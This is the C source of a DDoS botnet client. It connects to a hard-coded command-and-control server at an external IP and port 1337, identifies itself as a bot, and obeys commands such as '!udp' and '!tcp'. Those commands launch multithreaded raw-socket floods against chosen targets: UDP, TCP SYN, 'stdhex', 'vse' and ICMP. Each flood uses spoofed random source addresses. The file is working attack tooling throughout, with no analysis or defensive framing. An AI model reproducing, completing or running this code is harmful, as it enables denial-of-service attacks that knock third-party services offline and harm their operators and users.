#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <time.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>

#include "headers.h"
#include "checksum.h"

#include "payload.h"

// === Permissions (Set to 1 to allow attack) ===
int allow_udp = 1;
int allow_tcp = 1;
int allow_stdhex = 1;
int allow_vse = 1;
int allow_pps = 1;

// === Socket to C2 ===
int sock;
struct sockaddr_in server;

// === Function Prototypes ===
void start_connection(const char *host, int port);
void listen_for_commands();
void udp_flood(const char *ip, int port, int duration);
void tcp_flood(const char *ip, int port, int duration);
void stdhex_flood(const char *ip, int port, int duration);
void vse_flood(const char *ip, int port, int duration);
void pps_flood(const char *ip, int port, int duration);

void start_connection(const char *host, int port) {
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        close(sock);
        exit(1);
    }

    char identify_msg[128];
    snprintf(identify_msg, sizeof(identify_msg), "[BOT] ARCH:x86 IP:127.0.0.1\n");
    send(sock, identify_msg, strlen(identify_msg), 0);
}

void listen_for_commands() {
    char buffer[512];
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int n = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) break;

        buffer[n] = '\0';

        // Parse incoming command
        char ip[64];
        int port, duration;

        if (sscanf(buffer, "!udp %s %d %d", ip, &port, &duration) == 3 && allow_udp) {
            udp_flood(ip, port, duration);
        } else if (sscanf(buffer, "!tcp %s %d %d", ip, &port, &duration) == 3 && allow_tcp) {
            tcp_flood(ip, port, duration);
        } else if (sscanf(buffer, "!stdhex %s %d %d", ip, &port, &duration) == 3 && allow_stdhex) {
            stdhex_flood(ip, port, duration);
        } else if (sscanf(buffer, "!vse %s %d %d", ip, &port, &duration) == 3 && allow_vse) {
            vse_flood(ip, port, duration);
        } else if (sscanf(buffer, "!pps %s %d %d", ip, &port, &duration) == 3 && allow_pps) {
            pps_flood(ip, port, duration);
        }
    }
}


struct udp_args {
    char target_ip[64];
    int port;
    int duration;
};

void *udp_worker(void *arg) {
    struct udp_args *args = (struct udp_args *)arg;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("[udp_worker] raw socket error");
        return NULL;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target_ip, &dest.sin_addr);

    char packet[4096];

    uint32_t src_ip = (rand() % 253 + 1) << 24 | (rand() % 255) << 16 | (rand() % 255) << 8 | (rand() % 255);
    time_t end = time(NULL) + args->duration;

    while (time(NULL) < end) {
        memset(packet, 0, sizeof(packet));

        struct ipheader *iph = (struct ipheader *)packet;
        struct udpheader *udph = (struct udpheader *)(packet + sizeof(struct ipheader));
        char *data = packet + sizeof(struct ipheader) + sizeof(struct udpheader);

        const char *payload = hex_payloads[rand() % (sizeof(hex_payloads)/sizeof(char *))];
        int data_len = strlen(payload);
        memcpy(data, payload, data_len);

        // Fill UDP header
        udph->udph_srcport = htons(rand() % 65535);
        udph->udph_destport = htons(args->port);
        udph->udph_len = htons(sizeof(struct udpheader) + data_len);
        udph->udph_chksum = 0; // will be filled after pseudo header

        // Fill IP header
        iph->iph_ver = 4;
        iph->iph_ihl = 5;
        iph->iph_tos = 0;
        iph->iph_len = htons(sizeof(struct ipheader) + sizeof(struct udpheader) + data_len);
        iph->iph_ident = htons(rand() % 65535);
        iph->iph_offset = 0;
        iph->iph_ttl = 64;
        iph->iph_protocol = IPPROTO_UDP;
        iph->iph_sourceip = src_ip;
        iph->iph_destip = dest.sin_addr.s_addr;
        iph->iph_chksum = 0;
        iph->iph_chksum = calculate_checksum((unsigned short *)iph, sizeof(struct ipheader)/2);

        // Compute UDP checksum with pseudo header
        udph->udph_chksum = tcp_udp_checksum(
            udph,
            sizeof(struct udpheader) + data_len,
            iph->iph_sourceip,
            iph->iph_destip,
            IPPROTO_UDP
        );

        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct udpheader) + data_len,
               0, (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sock);
    return NULL;
}

struct tcp_args {
    char target_ip[64];
    int port;
    int duration;
};

void *tcp_worker(void *arg) {
    struct tcp_args *args = (struct tcp_args *)arg;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("[tcp_worker] raw socket error");
        return NULL;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target_ip, &dest.sin_addr);

    char packet[4096];

    uint32_t src_ip = (rand() % 253 + 1) << 24 | (rand() % 255) << 16 | (rand() % 255) << 8 | (rand() % 255);
    time_t end = time(NULL) + args->duration;

    while (time(NULL) < end) {
        memset(packet, 0, sizeof(packet));

        struct ipheader *iph = (struct ipheader *)packet;
        struct tcpheader *tcph = (struct tcpheader *)(packet + sizeof(struct ipheader));
        char *data = packet + sizeof(struct ipheader) + sizeof(struct tcpheader);

        // Fill TCP header
        tcph->th_sport = htons(rand() % 65535);
        tcph->th_dport = htons(args->port);
        tcph->th_seq = rand();
        tcph->th_ack = 0;
        tcph->th_offx2 = 0x50; // 5 * 4 = 20 bytes TCP header size
        tcph->th_flags = 0x02; // SYN flag set
        tcph->th_win = htons(5840); // Window size
        tcph->th_sum = 0; // Will be filled after pseudo header
        tcph->th_urp = 0;

        // Fill IP header
        iph->iph_ver = 4;
        iph->iph_ihl = 5;
        iph->iph_tos = 0;
        iph->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
        iph->iph_ident = htons(rand() % 65535);
        iph->iph_offset = 0;
        iph->iph_ttl = 64;
        iph->iph_protocol = IPPROTO_TCP;
        iph->iph_sourceip = src_ip;
        iph->iph_destip = dest.sin_addr.s_addr;
        iph->iph_chksum = 0;
        iph->iph_chksum = calculate_checksum((unsigned short *)iph, sizeof(struct ipheader)/2);

        // TCP checksum (pseudo header + TCP header)
        tcph->th_sum = tcp_udp_checksum(
            tcph,
            sizeof(struct tcpheader) + sizeof(data),
            iph->iph_sourceip,
            iph->iph_destip,
            IPPROTO_TCP
        );

        // Send the packet
        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct tcpheader),
            0, (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sock);
    return NULL;
}

struct stdhex_args {
    char target_ip[64];
    int port;
    int duration;
};

void *stdhex_worker(void *arg) {
    struct stdhex_args *args = (struct stdhex_args *)arg;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // Using TCP for packet construction
    if (sock < 0) {
        perror("[stdhex_worker] raw socket error");
        return NULL;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target_ip, &dest.sin_addr);

    char packet[4096];

    uint32_t src_ip = (rand() % 253 + 1) << 24 | (rand() % 255) << 16 | (rand() % 255) << 8 | (rand() % 255);
    time_t end = time(NULL) + args->duration;

    while (time(NULL) < end) {
        memset(packet, 0, sizeof(packet));

        struct ipheader *iph = (struct ipheader *)packet;
        struct tcpheader *tcph = (struct tcpheader *)(packet + sizeof(struct ipheader));
        char *data = packet + sizeof(struct ipheader) + sizeof(struct tcpheader);

        // Choose a random payload from hex_payloads
        const char *payload = hex_payloads[rand() % (sizeof(hex_payloads) / sizeof(char *))];
        int data_len = strlen(payload);
        memcpy(data, payload, data_len);

        // Fill TCP header
        tcph->th_sport = htons(rand() % 65535);
        tcph->th_dport = htons(args->port);
        tcph->th_seq = rand();
        tcph->th_ack = 0;
        tcph->th_offx2 = 0x50; // 5 * 4 = 20 bytes TCP header size
        tcph->th_flags = 0x02; // SYN flag set
        tcph->th_win = htons(5840); // Window size
        tcph->th_sum = 0; // Will be filled after pseudo header
        tcph->th_urp = 0;

        // Fill IP header
        iph->iph_ver = 4;
        iph->iph_ihl = 5;
        iph->iph_tos = 0;
        iph->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader) + data_len);
        iph->iph_ident = htons(rand() % 65535);
        iph->iph_offset = 0;
        iph->iph_ttl = 64;
        iph->iph_protocol = IPPROTO_TCP;
        iph->iph_sourceip = src_ip;
        iph->iph_destip = dest.sin_addr.s_addr;
        iph->iph_chksum = 0;
        iph->iph_chksum = calculate_checksum((unsigned short *)iph, sizeof(struct ipheader) / 2);

        // TCP checksum (pseudo header + TCP header + data)
        tcph->th_sum = tcp_udp_checksum(
            tcph,
            sizeof(struct tcpheader) + data_len,
            iph->iph_sourceip,
            iph->iph_destip,
            IPPROTO_TCP
        );

        // Send the packet
        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct tcpheader) + data_len,
               0, (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sock);
    return NULL;
}

struct vse_args {
    char target_ip[64];
    int port;
    int duration;
};

void *vse_worker(void *arg) {
    struct vse_args *args = (struct vse_args *)arg;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // Using raw TCP for packet construction
    if (sock < 0) {
        perror("[vse_worker] raw socket error");
        return NULL;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target_ip, &dest.sin_addr);

    char packet[4096];

    uint32_t src_ip = (rand() % 253 + 1) << 24 | (rand() % 255) << 16 | (rand() % 255) << 8 | (rand() % 255);
    time_t end = time(NULL) + args->duration;

    while (time(NULL) < end) {
        memset(packet, 0, sizeof(packet));

        struct ipheader *iph = (struct ipheader *)packet;
        struct tcpheader *tcph = (struct tcpheader *)(packet + sizeof(struct ipheader));
        char *data = packet + sizeof(struct ipheader) + sizeof(struct tcpheader);

        // Choose a random VSE payload from vse_payloads
        const char *payload = vse_payloads[rand() % (sizeof(vse_payloads) / sizeof(char *))];
        int data_len = strlen(payload);
        memcpy(data, payload, data_len);

        // Fill TCP header
        tcph->th_sport = htons(rand() % 65535);
        tcph->th_dport = htons(args->port);
        tcph->th_seq = rand();
        tcph->th_ack = 0;
        tcph->th_offx2 = 0x50; // 5 * 4 = 20 bytes TCP header size
        tcph->th_flags = 0x02; // SYN flag set
        tcph->th_win = htons(5840); // Window size
        tcph->th_sum = 0; // Will be filled after pseudo header
        tcph->th_urp = 0;

        // Fill IP header
        iph->iph_ver = 4;
        iph->iph_ihl = 5;
        iph->iph_tos = 0;
        iph->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader) + data_len);
        iph->iph_ident = htons(rand() % 65535);
        iph->iph_offset = 0;
        iph->iph_ttl = 64;
        iph->iph_protocol = IPPROTO_TCP;
        iph->iph_sourceip = src_ip;
        iph->iph_destip = dest.sin_addr.s_addr;
        iph->iph_chksum = 0;
        iph->iph_chksum = calculate_checksum((unsigned short *)iph, sizeof(struct ipheader) / 2);

        // TCP checksum (pseudo header + TCP header + data)
        tcph->th_sum = tcp_udp_checksum(
            tcph,
            sizeof(struct tcpheader) + data_len,
            iph->iph_sourceip,
            iph->iph_destip,
            IPPROTO_TCP
        );

        // Send the packet
        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct tcpheader) + data_len,
               0, (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sock);
    return NULL;
}

struct pps_args {
    char target_ip[64];
    int port;
    int duration;
};

void *pps_worker(void *arg) {
    struct pps_args *args = (struct pps_args *)arg;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);  // Using ICMP for small packets (ping-like)
    if (sock < 0) {
        perror("[pps_worker] raw socket error");
        return NULL;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target_ip, &dest.sin_addr);

    char packet[64];  // Small packet size (for more PPS)
    time_t end = time(NULL) + args->duration;

    while (time(NULL) < end) {
        memset(packet, 0, sizeof(packet));

        struct ipheader *iph = (struct ipheader *)packet;
        struct icmpheader *icmph = (struct icmpheader *)(packet + sizeof(struct ipheader));
        char *data = packet + sizeof(struct ipheader) + sizeof(struct icmpheader);

        // No need for a payload in this case, so just a simple "ping-like" data structure
        memset(data, 0xAA, 32);  // Arbitrary pattern for data

        // Fill ICMP header (ping-like packet)
        icmph->icmp_type = ICMP_ECHO;  // Echo request (ping)
        icmph->icmp_code = 0;
        icmph->icmp_id = rand() % 65535;
        icmph->icmp_seq = rand();
        icmph->icmp_cksum = 0;  // Checksum will be calculated later

        // Fill IP header
        iph->iph_ver = 4;
        iph->iph_ihl = 5;
        iph->iph_tos = 0;
        iph->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader) + 32);
        iph->iph_ident = htons(rand() % 65535);
        iph->iph_offset = 0;
        iph->iph_ttl = 64;
        iph->iph_protocol = IPPROTO_ICMP;
        iph->iph_sourceip = (rand() % 253 + 1) << 24 | (rand() % 255) << 16 | (rand() % 255) << 8 | (rand() % 255);
        iph->iph_destip = dest.sin_addr.s_addr;
        iph->iph_chksum = 0;
        iph->iph_chksum = calculate_checksum((unsigned short *)iph, sizeof(struct ipheader) / 2);

        // Compute ICMP checksum
        icmph->icmp_cksum = calculate_checksum((unsigned short *)icmph, sizeof(struct icmpheader) + 32 / 2);

        // Send the packet
        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct icmpheader) + 32, 0, (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sock);
    return NULL;
}



// === Empty Method Stubs ===
void udp_flood(const char *ip, int port, int duration) {
    printf("[udp_flood] Launching UDP flood on %s:%d for %d sec\n", ip, port, duration);

    int threads = 6; // Increase to max out device
    pthread_t tid[threads];

    struct udp_args args;
    strncpy(args.target_ip, ip, sizeof(args.target_ip)-1);
    args.port = port;
    args.duration = duration;

    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, udp_worker, &args);
        usleep(0);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    printf("[udp_flood] Done.\n");
}


void tcp_flood(const char *ip, int port, int duration) {
    printf("[tcp_flood] Launching TCP flood on %s:%d for %d sec\n", ip, port, duration);

    int threads = 6; // Number of threads to simulate the flood
    pthread_t tid[threads];

    struct tcp_args args;
    strncpy(args.target_ip, ip, sizeof(args.target_ip)-1);
    args.port = port;
    args.duration = duration;

    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, tcp_worker, &args);
        usleep(0);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    printf("[tcp_flood] Done.\n");
}


void stdhex_flood(const char *ip, int port, int duration) {
    printf("[stdhex_flood] Launching STDHEX flood on %s:%d for %d sec\n", ip, port, duration);

    int threads = 6; // Number of threads to simulate the flood
    pthread_t tid[threads];

    struct stdhex_args args;
    strncpy(args.target_ip, ip, sizeof(args.target_ip) - 1);
    args.port = port;
    args.duration = duration;

    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, stdhex_worker, &args);
        usleep(0);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    printf("[stdhex_flood] Done.\n");
}


void vse_flood(const char *ip, int port, int duration) {
    printf("[vse_flood] Launching VSE flood on %s:%d for %d sec\n", ip, port, duration);

    int threads = 6; // Number of threads to simulate the flood
    pthread_t tid[threads];

    struct vse_args args;
    strncpy(args.target_ip, ip, sizeof(args.target_ip) - 1);
    args.port = port;
    args.duration = duration;

    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, vse_worker, &args);
        usleep(0);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    printf("[vse_flood] Done.\n");
}


void pps_flood(const char *ip, int port, int duration) {
    printf("[pps_flood] Launching PPS flood on %s:%d for %d sec\n", ip, port, duration);

    int threads = 6;  // Number of threads to simulate the flood
    pthread_t tid[threads];

    struct pps_args args;
    strncpy(args.target_ip, ip, sizeof(args.target_ip) - 1);
    args.port = port;
    args.duration = duration;

    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, pps_worker, &args);
        usleep(0);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    printf("[pps_flood] Done.\n");
}

// === Entry Point ===
int main() {
    signal(SIGPIPE, SIG_IGN); // Prevent crashing if socket closes

    start_connection("209.141.48.207", 1337); // 🔁 Change to actual C2 IP and port
    listen_for_commands();

    close(sock);
    return 0;
}
